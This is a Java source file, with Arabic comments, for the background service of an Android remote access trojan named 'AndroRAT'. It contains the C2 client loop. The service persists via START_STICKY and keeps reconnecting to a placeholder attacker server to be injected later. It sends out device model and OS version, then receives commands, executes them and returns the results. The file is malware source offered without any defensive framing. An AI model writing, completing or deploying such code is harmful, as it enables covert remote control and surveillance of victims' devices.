package com.example.androratclient;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

/**
 * خدمة تعمل في الخلفية للحفاظ على الاتصال بسيرفر التحكم
 */
public class ClientService extends Service {
    private static final String TAG = "AndroRAT_ClientService";
    private static final String SERVER_IP = "YOUR_SERVER_IP"; // سيتم حقنه لاحقاً
    private static final int SERVER_PORT = YOUR_SERVER_PORT; // سيتم حقنه لاحقاً

    private Socket clientSocket;
    private PrintWriter out;
    private BufferedReader in;
    private boolean isConnected = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "ClientService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "ClientService started");
        new Thread(new ClientThread()).start();
        return START_STICKY; // لضمان إعادة تشغيل الخدمة إذا تم إيقافها
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "ClientService destroyed");
        try {
            if (clientSocket != null) {
                clientSocket.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error closing socket: " + e.getMessage());
        }
    }

    class ClientThread implements Runnable {
        @Override
        public void run() {
            while (!isConnected) {
                try {
                    Log.d(TAG, "Attempting to connect to server: " + SERVER_IP + ":" + SERVER_PORT);
                    clientSocket = new Socket(SERVER_IP, SERVER_PORT);
                    out = new PrintWriter(clientSocket.getOutputStream(), true);
                    in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                    isConnected = true;
                    Log.d(TAG, "Connected to server.");

                    // إرسال معلومات الجهاز عند الاتصال
                    out.println("DEVICE_INFO:" + android.os.Build.MODEL + ":" + android.os.Build.VERSION.RELEASE);

                    String message;
                    while ((message = in.readLine()) != null) {
                        Log.d(TAG, "Received command: " + message);
                        // هنا سيتم استدعاء CommandExecutor لتنفيذ الأمر
                        String result = CommandExecutor.execute(ClientService.this, message);
                        out.println("RESULT:" + result);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Connection error: " + e.getMessage());
                    isConnected = false;
                    try {
                        Thread.sleep(5000); // حاول الاتصال مرة أخرى بعد 5 ثوانٍ
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                    }
                }
            }
        }
    }
}

